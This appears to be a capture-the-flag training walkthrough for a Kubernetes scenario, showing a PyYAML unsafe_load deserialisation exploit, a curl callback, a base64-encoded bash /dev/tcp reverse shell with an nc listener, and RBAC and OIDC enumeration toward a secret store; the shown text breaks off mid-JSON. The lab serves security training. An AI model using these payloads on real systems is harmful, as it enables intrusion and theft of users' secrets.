# Scenario: Identity Theft

- [Learning Outcomes](#learning-outcomes)
- [Challenge Description](#challenge-description)
- [Guided Walkthrough](#guided-walkthrough)
  - [Step 1: Enumerate Internal Resources and Discover a Chatlog](#step-1-enumerate-internal-resources-and-discover-a-chatlog)
  - [Step 2: Enumerate External Resources and using Ephemeral Containers](#step-2-enumerate-external-resources-and-using-ephemeral-containers)
  - [Step 3: Enumerating the container filesystems and discover the second flag](#step-3-enumerating-the-container-filesystems-and-discover-the-second-flag)
  - [Step 4: Discovering the service account tokens to elevate privileges](#step-4-discovering-the-service-account-tokens-to-elevate-privileges)
  - [Step 5: Leveraging the ClusterRole Aggregation Controller to access the master node](#step-5-leveraging-the-clusterrole-aggregation-controller-to-access-the-master-node)
- [Remediation and Security Considerations](#remediation-and-security-considerations)

## Learning Outcomes

The purpose of Identity Theft is to provide a realistic environment for participants to understand how adversaries can exploit vulnerable applications to obtain access to a Kubernetes cluster and leverage over privileged service accounts to access sensitive data. Completing the scenario the participant will understand:

1. How adversaries exploit vulnerable applications to access underlying pods
2. The impact of overly privileged service accounts and how they can be exploited
3. More about the Open ID Connect (OIDC) authentication flow

## Challenge Description

```
                 ⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀
                 ⣿⡟⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⢻⣿⠀⠀
                 ⣿⡟⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
                 ⣿⡇⣿⣿⣿⣿⠿⠻⢿⣿⣿⣿⡇⢸⣿⣟⣛⣛⣛⣛⣛⣛⣛⣛⣿⣿⠀⠀
                 ⣿⡇⣿⣿⣿⠃⠀⠀⠀⢹⣿⣿⡇⢸⣿⣏⣉⣉⣉⣉⣉⣉⣿⣿⣿⣿⠀⠀
                 ⣿⡇⣿⣿⣿⡄⠀⠀⠀⣸⣿⣿⡇⢸⣿⣏⣉⣉⣿⣿⣉⣉⣉⣉⣿⣿⠀⠀
                 ⣿⡇⣿⣿⣿⠿⣦⣤⡾⠿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
                 ⣿⡇⣿⡿⠁⠀⠀⠀⠀⠀⠘⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
                 ⣿⡇⡿⠁⠀⠀⠀⠀⠀⠀⠀⠸⡇⢸⣿⣿⣿⣿⣿⣤⣤⣤⣤⣤⣼⣿⠀⠀
                 ⣿⡇⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⢸⣿⣿⣿⣤⣤⣤⣤⣤⣤⣤⣼⣿⠀⠀
                 ⠻⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
Captain Hλ$ħ𝔍Ⱥ¢k's motley crew have set their sights on Pod-Checker, a k8s pod schema validation service.

Based on OSINT, Pod-Checker has a secure, user store which is actively used for storing secrets.

Infiltrate the organisation, obtain persistence and plunder the users' identities.
```

## Guided Walkthrough

### Step 1: Enumerate internal and external resources

The first step is to enumerate the resources available within our starting point and what we can access externally. We can initial see that we have a user account of `elit3hexor` and are on a `public-terminal`. As we do not have a generic user (e.g. root), let's have a look at the user's local directory.

```bash
elit3hex0r@public-terminal:/$ ls -la ~
total 24
drwxr-xr-x 1 elit3hex0r elit3hex0r 4096 Oct  4 16:05 .
drwxr-xr-x 1 root       root       4096 Oct  4 16:05 ..
-rw-r--r-- 1 elit3hex0r elit3hex0r  220 Aug  5 14:57 .bash_logout
-rw-r--r-- 1 elit3hex0r elit3hex0r 3526 Aug  5 14:57 .bashrc
-rw-r--r-- 1 elit3hex0r elit3hex0r  807 Aug  5 14:57 .profile
-rw-rw---- 1 elit3hex0r elit3hex0r  184 Oct  4 15:46 hacker-notes.md
```

We can see a file called `hacker-notes.md` which contains the following notes:

```md
# Hacker Notes

author: elitehexor

## Initial Access

I've found the pod-checker frontend at: `ssh -F cp_simulator_config -L 8080:localhost:8080 -N bastion`

## Exploit

¯\_(ツ)_/¯
```

It seems pretty clear what to do next, so let's access the pod-checker frontend. Opening a browser and navigating to localhost:8080 we are presented with the following home page.

![Pod Checker Home Page](./images/1-home-page.png)

There is an `About` page which we can access where it states that Pod Checker is a tool for validating pod manifests.

![Pod Checker About Page](./images/2-about-page.png)

Let's do some testing and see what we can do with the interface. We can drop a pod manifest into the text box and click `SUBMIT` to see if it is valid.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test
  namespace: default
spec:
  containers:
  - image: ubuntu:latest
    command: ["sleep", "2d"]
    name: test
    ports:
    - name: http
      containerPort: 80
    imagePullPolicy: IfNotPresent
```

![Pod Checker Valid Pod](./images/3-valid-pod.png)

We get a `tick` as our pod manifest is valid. Let's try changing the `imagePullPolicy` to `Anything` which is not a valid value.

![Pod Checker Invalid Pod](./images/4-invalid-pod.png)

We get a `cross` as our pod manifest is invalid and under the `EXAMPLE POD MANIFEST` we get an example pod. Inspecting the page we can see `submit.js` which takes the input from the form and sends a POST request to the /schema endpoint. Within the console we can see our last two commands, the first returned `true` and the other returned `false`. If the manifest is invalid, the `/example` endpoint is invoked to obtain an example pod manifest.

![Pod Checker Console](./images/5-console.png)

### Step 2: Finding the vulnerability and exploiting PyYaml

This doesn't give us a lot to go on other than the fact we know that at some point in the backend it is validating yaml. Let's do a little research about yaml based vulnerabilities.

![Google Search](./images/6-google-search.png)

We can see a lot of references to serialization/deserialization vulnerabilities. The top results return `npm` and `python` based vulnerabilities. Let's try and find a `npm` based vulnerability for `js-yaml`. Searching the internet, we find an example string to test for a [js-yaml](https://github.com/advisories/GHSA-8j8c-7jfh-h6hx) vulnerability (2019).

Let's try using that string and see if we get a result.

![NodeJS Test](./images/7-nodejs-test.png)

We receive an invalid pod manifest response so it seems this may not be the avenue. Let's try and find a `python` based vulnerability for `pyyaml`. Searching the internet, we find an example string to test on [Hacktricks](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization#basic-exploit).

```yaml
!!python/object/apply:time.sleep [5]
```

![Python Test](./images/8-python-test.png)

Interesting...we did not get a response. Let's test this further by seeing if we can parse the command in a pod manifest and see if we can get a delayed response. We'll use the following YAML below:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test
  namespace: default
spec:
  containers:
  - image: ubuntu:latest
    command: [!!python/object/apply:time.sleep [5]]
    name: test
    ports:
    - name: http
      containerPort: 80
    imagePullPolicy: IfNotPresent
```

Excellent. We've managed to make the backend sleep for 5 seconds and confirm that it is using `pyyaml`. At this point we can try a couple of techniques such as obtaining sensitive data and if possible obtain a reverse shell. Fortunately our `publc-terminal` has netcat (`nc`) which is a network utility for reading from and writing to network connections using TCP or UDP. we can edit our payload to attempt to make a call to our netcat listener. We could go directly to a reverse shell but we may encounter issues such as encoding.

In Python we can invoke a system call with the following:

```yaml
!!python/object/new:os.system [<INSERT-SYSTEM-CALL>]
```

We can weaponise our payload to use `curl` which is common library in most Linux distributions, to make a http call to our netcat listener. But first we need to know what our IP address is? Using `env` command within our `public-terminal` reveals we are running in Kubernetes. Let's see if we have access to the Kubernetes API.

```bash
elit3hex0r@public-terminal:/$ kubectl auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

Great we can `get` pods. Running that via `kubectl` we see our `public-terminal`.

```bash
elit3hex0r@public-terminal:/$ kubectl get pods
NAME              READY   STATUS    RESTARTS   AGE
public-terminal   1/1     Running   0          72m
```

If we run the following command we can obtain our IP address.

```bash
elit3hex0r@public-terminal:/$ kubectl get pods -n public -ojson | jq -r '.items[].status.podIP'
192.168.109.68
```

Great, we've got what we need to build a payload.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test
  namespace: default
spec:
  containers:
  - image: ubuntu:latest
    command: [!!python/object/new:os.system [ curl 192.168.109.68:9090 ]]
    name: test
    ports:
    - name: http
      containerPort: 80
    imagePullPolicy: IfNotPresent
```

Let's start a netcat listener on our `public-terminal`.

```bash
elit3hex0r@public-terminal:/$ nc -nlvp 9090
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:9090
Ncat: Listening on 0.0.0.0:9090
```

And now send our payload to the pod-checker.

![Python Curl Connection](./images/9-python-curl-connection.png)

And we obtain a connection from an IP Address `192.168.109.66`.

![Netcat Connection](./images/10-netcat-connection.png)

### Step 3: Obtaining a reverse shell

Let's see if we can turn this into a full blown, reverse shell. There is a simple bash one liner that can help us here:

```bash
/bin/bash -i >& /dev/tcp/<IP-ADDRESS>/<PORT> 0>&1
```

> Note: If you like to learn more about different types of reverse shells, the following GitHub Repository has a useful list: [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)

Before we update our payload, let's have a look at the reverse shell one liner in more detail. The first part `/bin/bash -i` is invoking the bash shell with the `-i` flag which is used to launch an interactive shell. The next part `>& /dev/tcp/<IP-ADDRESS>/<PORT>` is redirecting the output of the bash shell to a TCP connection. The last part `0>&1` is redirecting the input of the bash shell to the output of the TCP connection.

As we are sending the payload as a HTTP POST request, we must be careful with url encoding. Thee redirecting is using a `&` which is a special character in HTTP requests. Because of this we are going to base64 encode our payload and then decode it and pipe it back to bash to execute. The command looks something like this:

```bash
echo "<BASE64>" | base64 -d | bash
```

Putting this altogether, we get the following payload:

```bash
elit3hex0r@public-terminal:/$ echo "/bin/bash -i >& /dev/tcp/192.168.109.68/9090 0>&1" | base64
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTA5LjY4LzkwOTAgMD4mMQo=
```

And we are going to drop the remaining manifest config for our payload and submit the following:

```yaml
!!python/object/new:os.system [ echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTA5LjY4LzkwOTAgMD4mMQo=" | base64 -d | bash ]
```

Before we do, setup a netcat listener again on our `public-terminal`.

```bash
elit3hex0r@public-terminal:/$ nc -lnvp 9090
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:9090
Ncat: Listening on 0.0.0.0:9090
```

![Reverse Shell](./images/13-reverse-shell.png)

```bash
elit3hex0r@public-terminal:/$ nc -lnvp 9090
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:9090
Ncat: Listening on 0.0.0.0:9090
Ncat: Connection from 192.168.109.66:39198.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@yamlidator-78f7dfb58f-564rx:/#
```

Excellent we have obtained a reverse shell on `yamlidator` which is running as `root`.

### Step 4: Enumerating the container filesystems and discover the first flag

Enumerating the filesystem we can see that we are in a container called `yamlidator` and not `pod-checker`. It would seem that `pod-checker` has called a vulnerable service. We can see the code in the `app.py` and where the vulnerability is.

```python
        try:
            yaml_data = yaml.unsafe_load(prep_data)
        except Exception:
            return yaml.YAMLError, 500, # cors_header
```

The Yamlidator service is using `unsafe_load` for pyyaml which is vulnerable to deserialisation and arbitary code execution. Additionally we can see the `Bekind` class uses `kubectl` to obtain the example for the pod manifest.

```python
        try:
            # run the command
            output = subprocess.check_output(["kubectl", "example", kind])
            decoded = str(output.decode("utf-8"))
```

We should make a note of this for later and let's continue to enumerate `Yamlidator`. If we look at `mount` we see a non-standard mount point for the container `mnt`.

```bash
root@yamlidator-78f7dfb58f-564rx:/# mount
mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/45/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/44/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/43/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/42/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/41/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/40/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/39/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/37/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/36/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/35/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/46/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/46/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime)
/dev/root on /mnt type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/root on /etc/hosts type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/root on /dev/termination-log type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/root on /etc/hostname type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/root on /etc/resolv.conf type ext4 (rw,relatime,discard,errors=remount-ro)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime,size=3912688k,inode64)
proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
tmpfs on /proc/acpi type tmpfs (ro,relatime,inode64)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
tmpfs on /proc/scsi type tmpfs (ro,relatime,inode64)
tmpfs on /sys/firmware type tmpfs (ro,relatime,inode64)
```

Let's have a look at the `mnt` directory.

```bash
root@yamlidator-78f7dfb58f-564rx:/# ls -la /mnt
ls -la /mnt
total 12
drwxr-xr-x 3 root root 4096 Nov 21 09:45 .
drwxr-xr-x 1 root root 4096 Nov 21 09:45 ..
drwxr-xr-x 2 root root 4096 Nov 21 09:45 snake-charmer
root@yamlidator-78f7dfb58f-564rx:/# ls -al /mnt/snake-charmer/
ls -al /mnt/snake-charmer/
total 12
drwxr-xr-x 2 root root 4096 Nov 21 09:45 .
drwxr-xr-x 3 root root 4096 Nov 21 09:45 ..
-rw-r--r-- 1 root root   50 Nov 21 09:45 flag.txt
root@yamlidator-78f7dfb58f-564rx:/# cat /mnt/snake-charmer/flag.txt
cat /mnt/snake-charmer/flag.txt
flag_ctf{UNSANITISED_USER_INPUT_YAMLIDATOR_PWNED}
```

Congraturations, you have found the first flag!

### Step 5: Enumerating external resources

We noted earlier that the `Bekind` class leverages `kubectl` so let's see what we can do with that. We can see that we have a service account and whether it has any interesting privileges.

```bash
root@yamlidator-78f7dfb58f-564rx:/# kubectl auth can-i --list
kubectl auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

It does. We have permissions to view namespaces, so let's see what namespaces there are.

```bash
root@yamlidator-78f7dfb58f-564rx:/# kubectl get namespaces
kubectl get namespaces
NAME               STATUS   AGE
backend            Active   120m
default            Active   121m
dex                Active   120m
frontend           Active   120m
kube-node-lease    Active   121m
kube-public        Active   121m
kube-system        Active   121m
kyverno            Active   120m
private-services   Active   120m
public             Active   120m
public-services    Active   120m
```

We have quite a number of namespaces to review but if we enumerate them all we find out that there are only two namespaces we have permissions too, the `dex` and the `private-services` namespaces.

```bash
kubectl auth can-i --list -n dex
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list]
services                                        []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

```bash
kubectl auth can-i --list -n private-services
Resources                                       Non-Resource URLs                     Resource Names   Verbs
pods/exec                                       []                                    []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get list create watch]
services                                        []                                    []               [get list patch update]
namespaces                                      []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

For dex, we have permissions to view services. For private-services, we have more permissions where we can `create` pods and `exec` into them and be able to `patch` and `update` services. Let's see what pods are running in the `private-services` namespace.

```bash
root@yamlidator-78f7dfb58f-564rx:/# kubectl get pods -n private-services
kubectl get pods -n private-services
NAME                            READY   STATUS    RESTARTS   AGE
secret-store-59785db8d6-2qgmt   1/1     Running   0          126m
```

Let's check the services, for both `dex` and `private-services`.

```bash
root@yamlidator-78f7dfb58f-564rx:/# kubectl get services -n private-services
kubectl get services -n private-services
NAME           TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)    AGE
secret-store   ClusterIP   10.108.3.247   <none>        5050/TCP   127m
```

```bash
root@yamlidator-78f7dfb58f-564rx:/# kubectl get services -n dex
kubectl get services -n dex
NAME   TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)    AGE
dex    ClusterIP   10.105.111.143   <none>        5556/TCP   127m
```

We can see two services. Dex is a A federated OpenID Connect (OIDC) Provider and is a CNCF project. For more information please see the following link: [Dex](https://dexidp.io/). As we were able to `curl` our `public-terminal` from the `yamlidator` container, let's see if we can `curl` the `dex` service.

```bash
root@yamlidator-78f7dfb58f-564rx:/# curl http://10.105.111.143:5556
curl http://dex.dex.svc.cluster.local:5556
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    19  100    19    0     0  19000      0 --:--:-- --:--:-- --:--:-- 19000
404 page not found
```

It is common for OIDC providers to have a public discovery endpoint. A little [research](https://dexidp.io/docs/development/oidc-certification/) we find that this should be `/dex/.well-known/openid-configuration`. If we add this to our request, we receive the following response:

```bash
root@yamlidator-78f7dfb58f-564rx:/# curl http://dex.dex.svc.cluster.local:5556/dex/.well-known/openid-configuration
<ter.local:5556/dex/.well-known/openid-configuration
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1210  100  1210    0     0   131k      0 --:--:-- --:--:-- --:--:--  131k
{
  "issuer": "http://dex.dex.svc.cluster.local:5556/dex",
  "authorization_endpoint": "http://dex.dex.svc.cluster.local:5556/dex/auth",
  "token_endpoint": "http://dex.dex.svc.cluster.local:5556/dex/token",
  "jwks_uri": "http://dex.dex.svc.cluster.local:5556/dex/keys",
  "userinfo_endpoint": "http://dex.dex.svc.cluster.local:5556/dex/userinfo",
  "device_authorization_endpoint": "http://dex.dex.svc.cluster.local:5556/dex/device/code",
  "grant_types_supported": [
    "authorization_code",
    "password",
    "refresh_token",
    "urn:ietf:params:oauth:grant-type:device_code"
  ],
  "response_types_supported": [
    "code"
  ],
  "subject_types_supported": [
    "public"
  ],
  "id_token_signing_alg_values_supported": [
    "RS256"
  ],
  "code_challenge_methods_supported": [
    "S256",
    "plain"
  ],
  "scopes_supported": [
    "openid",
    "email",
    "groups",
    "profile",
    "offline_access"
  ],
  "token_endpoint_auth_methods_supported": [
    "client_secret_basic",
    "client_secret_post"
  ],
  "claims_supported": [
    "iss",
    "sub",
    "aud",
    "iat",
    "exp",
    "email",
    "email_verified",
    "locale",
    "name",
    "preferred_username",
    "at_hash"
  ]
}
```

We can see the various endpoints which can be used to obtain a `jwt` token. Unfortunately, we have no idea what the client secret is to obtain a token. Let's see if we can find out more about the `secret-store` service.

```bash
curl http://secret-store.private-services.svc.cluster.local:5050
<ecret-store.private-services.svc.cluster.local:5050
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    54  100    54    0     0   9000      0 --:--:-- --:--:-- --:--:--  9000
<a href="/swagger/index.html">Moved Permanently</a>.
```

We get a `Moved Permanently` response and reference to swagger index page which suggests there is an API. Let's follow the link.

```bash
curl http://secret-store.private-services.svc.cluster.local:5050/swagger/index.html
<-services.svc.cluster.local:5050/swagger/index.html
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3728    0  3728    0     0   520k      0 --:--:-- --:--:-- --:--:--  520k

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Swagger UI</title>
  <link rel="stylesheet" type="text/css" href="./swagger-ui.css" >
  <link rel="icon" type="image/png" href="./favicon-32x32.png" sizes="32x32" />
  <link rel="icon" type="image/png" href="./favicon-16x16.png" sizes="16x16" />
  <style>
    html
    {
        box-sizing: border-box;
        overflow: -moz-scrollbars-vertical;
        overflow-y: scroll;
    }
    *,
    *:before,
    *:after
    {
        box-sizing: inherit;
    }

    body {
      margin:0;
      background: #fafafa;
    }
  </style>
</head>

<body>

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="position:absolute;width:0;height:0">
  <defs>
    <symbol viewBox="0 0 20 20" id="unlocked">
          <path d="M15.8 8H14V5.6C14 2.703 12.665 1 10 1 7.334 1 6 2.703 6 5.6V6h2v-.801C8 3.754 8.797 3 10 3c1.203 0 2 .754 2 2.199V8H4c-.553 0-1 .646-1 1.199V17c0 .549.428 1.139.951 1.307l1.197.387C5.672 18.861 6.55 19 7.1 19h5.8c.549 0 1.428-.139 1.951-.307l1.196-.387c.524-.167.953-.757.953-1.306V9.199C17 8.646 16.352 8 15.8 8z"></path>
    </symbol>

    <symbol viewBox="0 0 20 20" id="locked">
      <path d="M15.8 8H14V5.6C14 2.703 12.665 1 10 1 7.334 1 6 2.703 6 5.6V8H4c-.553 0-1 .646-1 1.199V17c0 .549.428 1.139.951 1.307l1.197.387C5.672 18.861 6.55 19 7.1 19h5.8c.549 0 1.428-.139 1.951-.307l1.196-.387c.524-.167.953-.757.953-1.306V9.199C17 8.646 16.352 8 15.8 8zM12 8H8V5.199C8 3.754 8.797 3 10 3c1.203 0 2 .754 2 2.199V8z"/>
    </symbol>

    <symbol viewBox="0 0 20 20" id="close">
      <path d="M14.348 14.849c-.469.469-1.229.469-1.697 0L10 11.819l-2.651 3.029c-.469.469-1.229.469-1.697 0-.469-.469-.469-1.229 0-1.697l2.758-3.15-2.759-3.152c-.469-.469-.469-1.228 0-1.697.469-.469 1.228-.469 1.697 0L10 8.183l2.651-3.031c.469-.469 1.228-.469 1.697 0 .469.469.469 1.229 0 1.697l-2.758 3.152 2.758 3.15c.469.469.469 1.229 0 1.698z"/>
    </symbol>

    <symbol viewBox="0 0 20 20" id="large-arrow">
      <path d="M13.25 10L6.109 2.58c-.268-.27-.268-.707 0-.979.268-.27.701-.27.969 0l7.83 7.908c.268.271.268.709 0 .979l-7.83 7.908c-.268.271-.701.27-.969 0-.268-.269-.268-.707 0-.979L13.25 10z"/>
    </symbol>

    <symbol viewBox="0 0 20 20" id="large-arrow-down">
      <path d="M17.418 6.109c.272-.268.709-.268.979 0s.271.701 0 .969l-7.908 7.83c-.27.268-.707.268-.979 0l-7.908-7.83c-.27-.268-.27-.701 0-.969.271-.268.709-.268.979 0L10 13.25l7.418-7.141z"/>
    </symbol>


    <symbol viewBox="0 0 24 24" id="jump-to">
      <path d="M19 7v4H5.83l3.58-3.59L8 6l-6 6 6 6 1.41-1.41L5.83 13H21V7z"/>
    </symbol>

    <symbol viewBox="0 0 24 24" id="expand">
      <path d="M10 18h4v-2h-4v2zM3 6v2h18V6H3zm3 7h12v-2H6v2z"/>
    </symbol>

  </defs>
</svg>

<div id="swagger-ui"></div>

<script src="./swagger-ui-bundle.js"> </script>
<script src="./swagger-ui-standalone-preset.js"> </script>
<script>
window.onload = function() {

  const ui = SwaggerUIBundle({
    url: "doc.json",
    dom_id: '#swagger-ui',
    validatorUrl: null,
    oauth2RedirectUrl: `${window.location.protocol}//${window.location.host}${window.location.pathname.split('/').slice(0, window.location.pathname.split('/').length - 1).join('/')}/oauth2-redirect.html`,
    persistAuthorization:  false ,
    presets: [
      SwaggerUIBundle.presets.apis,
      SwaggerUIStandalonePreset
    ],
    plugins: [
      SwaggerUIBundle.plugins.DownloadUrl
    ],
	layout: "StandaloneLayout",
    docExpansion: "list",
	deepLinking:  true ,
	defaultModelsExpandDepth:  1
  })

  const defaultClientId = "";
  if (defaultClientId) {
    ui.initOAuth({
      clientId: defaultClientId
    })
  }

  window.ui = ui
}
</script>
</body>

</html>
```

We receive the swagger UI page but unfortunately we do not have a means to render it in the browser easily. In closer inspection, we do see a reference to a `doc.json` file. Let's try and request that.

```bash
curl http://secret-store.private-services.svc.cluster.local:5050/swagger/doc.json
<te-services.svc.cluster.local:5050/swagger/doc.json
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3468    0  3468    0     0   483k      0 --:--:-- --:--:-- --:--:--  483k
{
    "schemes": [],
    "swagger": "2.0",
    "info": {
        "description": "",
        "title": "",
        "contact": {},
        "version": ""
    },
    "host": "",
    "basePath": "api/v1",
    "paths": {
        "/users": {
            "get": {
                "description": "get all users",
                "consumes": [
                    "application/json"
                ],
                "produces": [
                    "application/json"
                ],
                "tags": [
                    "users"
                ],
                "summary": "get all users",
                "responses": {
                    "200": {
                        "description": "OK",
                        "schema": {
                            "type": "string"
                        }
                    }
                }
            },
            "post": {
                "description": "add a new user",
                "consumes": [
                    "application/json"
                ],
                "produces": [
                    "application/json"
                ],
                "tags": [
                    "users"
                ],
                "summary": "add a new user",
                "responses": {
                    "201": {
                        "description": "Created",
                        "schema": {
                            "type": "string"
                        }
                    }
                }
            }
        },
        "/users/:userId": {
            "get": {
                "description": "get user by id",
                "consumes": [
                    "application/json"
                ],
                "produces": [
